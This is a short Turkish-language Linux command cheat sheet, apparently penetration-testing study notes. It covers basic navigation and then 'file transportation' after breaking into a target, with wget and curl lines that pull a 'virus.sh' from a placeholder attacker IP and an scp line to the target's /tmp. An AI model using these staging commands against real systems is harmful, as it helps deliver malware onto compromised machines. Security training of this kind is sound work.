## Navigasyon ve Okuma
* `pwd`: Şu an hangi klasörde olduğunu gösterir.
* `ls -la`: Gizli dosyalar dahil tüm dosyaları listeler.
* `cd /dizin/yolu`: İstediğin klasöre gitmeni sağlar. (`cd ..` bir üst klasöre çıkarır).
* `cat dosya.txt`: Dosyanın içindeki yazıları terminale basar.
* `grep "aranan_kelime" dosya.txt`: Dosyanın içindeki belirli bir kelimeyi/şifreyi arar (Hacker'ın en iyi dostu).

## Dosya Transfer Metotları (File Transportation)
Hedef sisteme sızdığımızda, kendi bilgisayarımızdan oraya virüs/araç atmak için kullanırız.
* **`wget http://IP_Adresin/virus.sh`**: Web sunucusundan dosya indirir.
* **`curl -O http://IP_Adresin/virus.sh`**: wget'in alternatifidir.
* **`scp dosya.txt kullanici@hedef_IP:/tmp`**: SSH üzerinden güvenli (şifreli) dosya transferi yapar.